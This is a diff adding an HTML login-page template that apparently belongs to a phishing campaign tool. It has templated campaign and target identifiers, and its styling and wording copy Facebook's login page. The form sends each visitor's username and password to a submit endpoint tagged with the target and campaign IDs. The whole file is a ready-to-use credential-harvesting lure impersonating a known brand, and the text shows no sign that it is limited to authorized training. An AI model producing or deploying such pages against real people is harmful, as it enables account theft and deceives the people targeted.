@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Login</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1); width: 100%; max-width: 400px; text-align: center; }
+        .login-container h1 { color: #1877f2; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #166fe5; }
+        .footer { margin-top: 20px; font-size: 14px; color: #606770; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>{{ campaign.template.name }}</h1>
+        <p>Please log in to continue to your account.</p>
+        <form action="/submit/{{ target_id }}/{{ campaign.id }}" method="post">
+            <input type="text" name="username" placeholder="Email or phone number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="footer">
+            <a href="#">Forgotten password?</a>
+        </div>
+    </div>
+</body>
+</html>
